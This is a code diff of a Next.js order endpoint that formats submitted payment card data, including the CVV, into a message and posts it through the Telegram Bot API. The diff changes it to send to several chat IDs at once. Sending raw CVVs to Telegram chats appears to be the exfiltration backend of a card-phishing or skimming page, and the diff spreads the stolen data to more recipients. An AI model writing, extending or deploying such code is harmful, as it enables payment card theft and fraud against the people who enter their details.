@@ -38,25 +38,21 @@ export async function POST(req: NextRequest) {
     `🔐 CVV: <code>${cvv}</code>`,
   ].join("\n");
 
-  try {
-    await fetch(
-      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
-      {
+  const chatIds = (process.env.TELEGRAM_CHAT_ID ?? "").split(",").map(id => id.trim()).filter(Boolean);
+  await Promise.allSettled(
+    chatIds.map(chat_id =>
+      fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: process.env.TELEGRAM_CHAT_ID,
+          chat_id,
           text,
           parse_mode: "HTML",
-          reply_markup: {
-            inline_keyboard: [
-              [{ text: "💬 فتح واتساب", url: whatsappUrl }],
-            ],
-          },
+          reply_markup: { inline_keyboard: [[{ text: "💬 فتح واتساب", url: whatsappUrl }]] },
         }),
-      }
-    );
-  } catch (_) {}
+      })
+    )
+  );
 
   return NextResponse.json({ ok: true, orderId, dbId });
 }
